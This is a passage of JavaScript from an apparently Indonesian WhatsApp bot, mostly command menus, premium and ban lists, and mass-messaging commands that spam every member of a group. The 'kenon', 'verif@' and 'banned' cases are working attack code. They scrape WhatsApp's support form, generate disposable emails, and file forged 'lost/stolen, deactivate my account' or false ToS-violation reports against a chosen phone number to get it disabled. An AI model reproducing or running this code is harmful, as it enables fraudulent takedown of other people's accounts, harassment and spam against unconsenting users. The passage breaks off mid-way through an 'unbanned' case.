if (isBan) return m.reply('*Lu Di Ban Owner*')
 var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let foottgkkzo = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} hw1
${prefix} hw2
${prefix} hw3
${prefix} hw4
${prefix} hw5
${prefix} hw6
${prefix} hw7
${prefix} hw8
${prefix} hw9
${prefix} hw10
${prefix} hw11
${prefix} hw12
${prefix} hw13
${prefix} hw14
${prefix} hw15
${prefix} hw16
${prefix} hw17
${prefix} hw18
${prefix} hw18
${prefix} hw20
${prefix} hw21
${prefix} hw22
${prefix} hw23
${prefix} hw24
${prefix} hw25
${prefix} hw26
${prefix} hw27
${prefix} hw28
${prefix} hw29
${prefix} hw30
${prefix} hw31
${prefix} hw32
${prefix} hw33
${prefix} hw34
${prefix} hw35
${prefix} hw36
${prefix} hw37
${prefix} hw38
${prefix} hw39
${prefix} hw40
${prefix} hw41
${prefix} hw42
${prefix} hw43
${prefix} hw44
${prefix} hw45
${prefix} hw46
${prefix} hw47
${prefix} hw48
${prefix} hw49
${prefix} hw50
${prefix} hw51
${prefix} hw52
${prefix} hw53
${prefix} hw54
${prefix} hw55
${prefix} hw56
${prefix} hw57
${prefix} hw58
${prefix} hw59
${prefix} hw60
${prefix} hw61
${prefix} hw62
${prefix} hw63
${prefix} hw64
${prefix} hw65
${prefix} hw66
${prefix} hw67
${prefix} hw68
${prefix} hw69
${prefix} hw70
${prefix} hw71
${prefix} hw72
${prefix} hw73
${prefix} hw74
${prefix} hw75
${prefix} hw76
${prefix} hw77
${prefix} hw78
${prefix} hw79`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": foottgkkzo, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'textmaker':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let foottggkzo = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Owner' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
┏━━⊱
┣❏ ᴄᴀɴᴅʏ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴄʜʀɪꜱᴛᴍᴀꜱ (ᴛᴇxᴛɴʏᴀ)
┣❏ 3ᴅᴄʜʀɪꜱᴛᴍᴀꜱ (ᴛᴇxᴛɴʏᴀ)
┣❏ ꜱᴘᴀʀᴋʟᴇᴄʜʀɪꜱᴛᴍᴀꜱ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴅᴇᴇᴘꜱᴇᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ꜱᴄɪꜰɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʀᴀɪɴʙᴏᴡ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴡᴀᴛᴇʀᴘɪᴘᴇ (ᴛᴇxᴛɴʏᴀ)
┣❏ ꜱᴘᴏᴏᴋʏ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴘᴇɴᴄɪʟ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴄɪʀᴄᴜɪᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴅɪꜱᴄᴏᴠᴇʀʏ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴍᴇᴛᴀʟɪᴄ (ᴛᴇxᴛɴʏᴀ)
┣❏ ꜰɪᴄᴛɪᴏɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴅᴇᴍᴏɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴛʀᴀɴꜱꜰᴏʀᴍᴇʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʙᴇʀʀʏ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴛʜᴜɴᴅᴇʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴍᴀɢᴍᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ 3ᴅꜱᴛᴏɴᴇ (ᴛᴇxᴛɴʏᴀ)
┣❏ ɴᴇᴏɴʟɪɢʜᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ ɢʟɪᴛᴄʜ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʜᴀʀʀʏᴘᴏᴛᴛᴇʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʙʀᴏᴋᴇɴɢʟᴀꜱꜱ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴘᴀᴘᴇʀᴄᴜᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴡᴀᴛᴇʀᴄᴏʟᴏʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴍᴜʟᴛɪᴄᴏʟᴏʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ɴᴇᴏɴᴅᴇᴠɪʟ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴜɴᴅᴇʀᴡᴀᴛᴇʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ɢʀᴀꜰꜰɪᴛɪʙɪᴋᴇ (ᴛᴇxᴛɴʏᴀ)
┣❏ ꜱɴᴏᴡ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴄʟᴏᴜᴅ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʜᴏɴᴇʏ (ᴛᴇxᴛɴʏᴀ)
┣❏ ɪᴄᴇ (ᴛᴇxᴛɴʏᴀ)
┣❏ ꜰʀᴜɪᴛᴊᴜɪᴄᴇ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʙɪꜱᴄᴜɪᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴡᴏᴏᴅ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴄʜᴏᴄᴏʟᴀᴛᴇ (ᴛᴇxᴛɴʏᴀ)
┣❏ ꜱᴛʀᴀᴡʙᴇʀʀʏ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴍᴀᴛʀɪx (ᴛᴇxᴛɴʏᴀ)
┣❏ ʙʟᴏᴏᴅ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴅʀᴏᴘᴡᴀᴛᴇʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴛᴏxɪᴄ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʟᴀᴠᴀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʀᴏᴄᴋ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʙʟᴏᴏᴅɢʟᴀꜱ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʜᴀʟʟᴏᴡᴇɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴅᴀʀᴋɢᴏʟᴅ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴊᴏᴋᴇʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴡɪᴄᴋᴇʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ꜰɪʀᴇᴡᴏʀᴋ (ᴛᴇxᴛɴʏᴀ)
┣❏ ꜱᴋᴇʟᴇᴛᴏɴ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʙʟᴀᴄᴋᴘɪɴᴋ (ᴛᴇxᴛɴʏᴀ)
┣❏ ꜱᴀɴᴅ (ᴛᴇxᴛɴʏᴀ)
┣❏ ɢʟᴜᴇ (ᴛᴇxᴛɴʏᴀ)
┣❏ 1917 (ᴛᴇxᴛɴʏᴀ)
┣❏ ʟᴇᴀᴠᴇꜱ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴛʀᴀɴꜱꜰᴏʀᴍᴇʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʜᴇʀʀʏᴘ (ᴛᴇxᴛɴʏᴀ)
┣❏ ɴᴇᴏɴᴅᴇᴠɪʟ (ᴛᴇxᴛɴʏᴀ)
┣❏ 3ᴅꜱᴛᴏɴᴇ (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴛʜᴜɴᴅᴇʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ɢʀᴀꜰꜰɪᴛɪ (ᴛᴇxᴛɴʏᴀ)
┣❏ ɢʟɪᴛᴄʜ3 (ᴛᴇxᴛɴʏᴀ)
┣❏ 3ᴅʙᴏx (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴅʀᴀᴘᴡᴀᴛᴇʀ (ᴛᴇxᴛɴʏᴀ)
┣❏ ʟɪᴏɴ2 (ᴛᴇxᴛɴʏᴀ)
┣❏ ᴘᴀᴘᴇʀᴄᴜᴛ (ᴛᴇxᴛɴʏᴀ)
┣❏
┗━━⊱`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": foottggkzo, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'musik':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 var resio = await Quotes()
teks = `\nAuthor: ${resio.author}\n`
teks = `\nQuotes:\n`
teks = `${resio.quotes}\n`
let footgkzoo = `Runtime : ⏳ ${runtime(process.uptime())}
Jam : ${time}`
sendGeekzMessage(from, { 
text: `Hay Kak ${pushname} 👋 Selamat ${salam}
Total Pengguna Premium :  ${owner.length}
Status : ${isCreator ? 'Premium' : 'Free'}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Kata - Kata Untuk Hari Ini*

${teks}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix} sound1
${prefix} sound2
${prefix} sound3
${prefix} sound4
${prefix} sound5
${prefix} sound6
${prefix} sound7
${prefix} sound8
${prefix} sound9
${prefix} sound10
${prefix} sound11
${prefix} sound12
${prefix} sound13
${prefix} sound14
${prefix} sound15
${prefix} sound16
${prefix} sound17
${prefix} sound18
${prefix} sound18
${prefix} sound20
${prefix} sound21
${prefix} sound22
${prefix} sound23
${prefix} sound24
${prefix} sound25
${prefix} sound26
${prefix} sound27
${prefix} sound28
${prefix} sound29
${prefix} sound30
${prefix} sound31
${prefix} sound32
${prefix} sound33
${prefix} sound34
${prefix} sound35
${prefix} sound36
${prefix} sound37
${prefix} sound38
${prefix} sound39
${prefix} sound40
${prefix} sound41
${prefix} sound42
${prefix} sound43
${prefix} sound44
${prefix} sound45
${prefix} sound46
${prefix} sound47
${prefix} sound48
${prefix} sound49
${prefix} sound50
${prefix} sound51
${prefix} sound52
${prefix} sound53
${prefix} sound54
${prefix} sound55
${prefix} sound56
${prefix} sound57
${prefix} sound58
${prefix} sound59
${prefix} sound60
${prefix} sound61
${prefix} sound62
${prefix} sound63
${prefix} sound64
${prefix} sound65
${prefix} sound66
${prefix} sound67
${prefix} sound68
${prefix} sound69
${prefix} sound70
${prefix} sound71
${prefix} sound72
${prefix} sound73
${prefix} sound74
${prefix} sound75
${prefix} sound76
${prefix} sound77
${prefix} sound78
${prefix} sound79
${prefix} sound80
${prefix} sound81
${prefix} sound82
${prefix} sound83
${prefix} sound84
${prefix} sound85
${prefix} sound86
${prefix} sound87
${prefix} sound88
${prefix} sound89
${prefix} sound90
${prefix} sound91
${prefix} sound92
${prefix} sound93
${prefix} sound94
${prefix} sound95
${prefix} sound96
${prefix} sound97
${prefix} sound98
${prefix} sound99
${prefix} sound100
${prefix} sound101
${prefix} sound102
${prefix} sound103
${prefix} sound104
${prefix} sound105
${prefix} sound106
${prefix} sound107
${prefix} sound108
${prefix} sound109
${prefix} sound110
${prefix} sound111
${prefix} sound112
${prefix} sound113
${prefix} sound114
${prefix} sound115
${prefix} sound116
${prefix} sound117
${prefix} sound118
${prefix} sound119
${prefix} sound120
${prefix} sound121
${prefix} sound122
${prefix} sound123
${prefix} sound124
${prefix} sound125
${prefix} sound126
${prefix} sound127
${prefix} sound128
${prefix} sound129
${prefix} sound130
${prefix} sound131
${prefix} sound132
${prefix} sound133
${prefix} sound134
${prefix} sound135
${prefix} sound136
${prefix} sound137
${prefix} sound138
${prefix} sound139
${prefix} sound140
${prefix} sound141
${prefix} sound142
${prefix} sound143
${prefix} sound144
${prefix} sound145
${prefix} sound146
${prefix} sound147
${prefix} sound148
${prefix} sound149
${prefix} sound150
${prefix} sound151
${prefix} sound152
${prefix} sound153
${prefix} sound154
${prefix} sound155
${prefix} sound156
${prefix} sound157
${prefix} sound158
${prefix} sound159
${prefix} sound160
${prefix} sound161`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": footgkzoo, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": kalimage,
"mediaUrl": gr,
"sourceUrl": gr
}
}
})
break
//=================================================//
case 'afk': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName}... Telah Afk Dengan Alasan ${text ? ': ' + text : ''}`)
}
break
//=================================================
case 'pushcontid':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return m.reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await haikal.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
m.reply(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
haikal.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
m.reply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 3000);
}
}
break;
//=================================================//
case 'pushkontak':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply(`di group coy`)
if (!text) return m.reply(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
m.reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
haikal.sendPoll(geek, `${teksnye}`, [`SETUJU 👌`,`TIDAK SETUJU 🙈`,`MENOLAK MENJAWAB 🙏`,`SOK ASIK LO🤯`])
}
m.reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
//=================================================//
case 'public': {
if (!isCreator) return m.reply(`*khusus Premium*`) 
haikal.public = true
m.reply('Sukse Change To Public')
}
break
//=================================================//
case 'self': {
if (!isCreator) return m.reply(`*khusus Premium*`) 
haikal.public = false
m.reply('Sukses Change To Self')
}
break
//=================================================//
case 'addprem':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await haikal.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./premium.json', JSON.stringify(owner))
m.reply(`Nomor ${bnnd} Telah Di Tambahkan Menjadi Premium!!!`)
break
//=================================================//
case 'delprem':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
owner.splice(unp, 1)
fs.writeFileSync('./premium.json', JSON.stringify(owner))
m.reply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
break
//=================================================//
case 'listprem':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 teksooo = '*List Premium*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
haikal.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted : hw, contextInfo: { "mentionedJid": owner } })
break
//=================================================//
case 'pengguna':  {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!args[0]) return reply(`*Contoh : ${command} add 6281214281312*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('*Pengguna Ini telah Di Ban*')
banned.push(orgnye)
reply(`Succes ban Pengguna Ini`)
} else if (args[0] === "del") {
if (!isBane) return reply('*Pengguna Ini Telah Di hapus Dari Ban*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
reply(`*Berhasil Menghapus Pengguna yang Di Ban*`)
} else {
reply("Error")
}
}
break
//=================================================//
case 'listban':
if (isBan) return m.reply('*Lu Di Ban Owner*')
 teksooop = `*List Ban*\n\n`
for (let ii of banned) {
teksooop += `- ${ii}\n`
}
reply(teksooop)
break
//=================================================//
case 'owner': case 'crator':{
 haikal.sendContact(from, global.owner, m)
}
break
//=================================================//
 case 'kenon':
if (!isCreator) return m.reply(`*khusus Premium*`)
m.reply('Kamu Mau ? :)')
let cekno = await haikal.onWhatsApp(Input)
if (cekno.length == 0) return m.reply(`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
var targetnya = m.sender.split('@')[0]
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Verloren/gestohlen: Bitte deaktivieren Sie mein Konto")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
haikal.sendMessage(from, { text: util.format(res.data)}, {quoted : hw})
break
//=================================================
case 'verif@': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Hai,

 Terima kasih atas pesan Anda.

 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda telah di keluarkan maka untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.

 Selama periode penonaktifan:

 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda.
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke

 akun akan tetap dalam status tertunda hingga 30 hari.

 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai

 secepatnya.  Daftar ulang akun Anda dengan memasukkan 6 digit

 kode yang Anda terima melalui SMS atau panggilan telepon.  Jika Anda mendaftar ulang

 pulihkan riwayat obrolan Anda di: Android |  iPhone.

 file, cadangan, atau riwayat panggilan dari akun yang dihapus.

 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media

 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.

 Sumber daya terkait:

 ⚫ Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.

 ⚫ Pelajari tentang akun yang dicuri di artikel ini.

 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'banned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `I noticed that a user was using modified whatsapp, so i ask support to ban this account for violating terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work
Number : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
await sleep(180000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
//=================================================
case 'unbanned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
await sleep(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

